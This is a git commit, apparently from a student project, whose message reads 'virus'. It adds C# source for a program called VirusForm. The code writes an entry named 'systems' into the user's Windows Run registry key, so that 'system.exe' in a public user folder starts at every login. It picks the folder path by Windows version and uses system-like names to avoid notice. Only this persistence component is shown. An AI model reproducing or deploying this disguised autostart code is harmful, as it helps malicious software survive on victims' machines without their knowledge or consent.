b03e0397cee59071b75b7095982cf620648cc0e6
unknown <user@a5comp3.step.itstep.rv.ua>
2015-05-13 21:54:45 +0300

    virus

---
+++ Virus/VirusForm/Autorun.cs
@@ -0,0 +1,37 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace VirusForm
+{
+    static class Autorun
+    {
+
+       public static bool SetAutorunValue(bool autorun, string npath)
+        {
+            const string name = "systems";
+            string ExePath = npath;
+            RegistryKey reg;
+
+            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+                if (autorun)
+                    reg.SetValue(name, ExePath);
+                else
+                    reg.DeleteValue(name);
+                reg.Flush();
+                reg.Close();
+            }
+            catch
+            {
+                return false;
+            }
+            return true;
+        }
+    }
+    
+}
---
+++ Virus/VirusForm/Form1.cs
@@ -0,0 +1,35 @@
+﻿using JCS;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace VirusForm
+{
+    public partial class Form1 : Form
+    {
+        public static string needPatch = "C:\\Users\\Public\\";
+        public Form1()
+        {
+            if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista")
+            {
+                Autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
+                //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
+            }
+            else
+                if (OSVersionInfo.Name == "Windows XP")
+                {
+                    needPatch = "C:\\Documents and Settings\\All Users\\";
+                    Autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
+                    //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
+                }
+            InitializeComponent();
+
+        }
+    }
+}
